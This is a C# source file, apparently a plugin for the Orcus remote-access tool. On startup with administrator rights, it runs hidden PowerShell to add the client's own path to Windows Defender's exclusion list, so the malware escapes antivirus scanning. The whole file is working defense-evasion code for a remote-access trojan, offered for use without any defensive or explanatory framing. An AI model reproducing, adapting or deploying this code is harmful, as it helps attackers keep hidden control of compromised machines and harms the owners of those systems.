using System.Diagnostics;
using Orcus.Plugins;

namespace Orcus.DefenderExcluer;

public class Plugin : ClientController
{
	public override bool InfluenceStartup(IClientStartup clientStartup)
	{
		if (!clientStartup.IsAdministrator)
		{
			return false;
		}
		string clientPath = clientStartup.ClientPath;
		Process.Start(new ProcessStartInfo
		{
			FileName = "powershell.exe",
			Arguments = "-Command \"Add-MpPreference -ExclusionPath '" + clientPath + "'\"",
			Verb = "runas",
			UseShellExecute = true,
			CreateNoWindow = true
		});
		return true;
	}
}
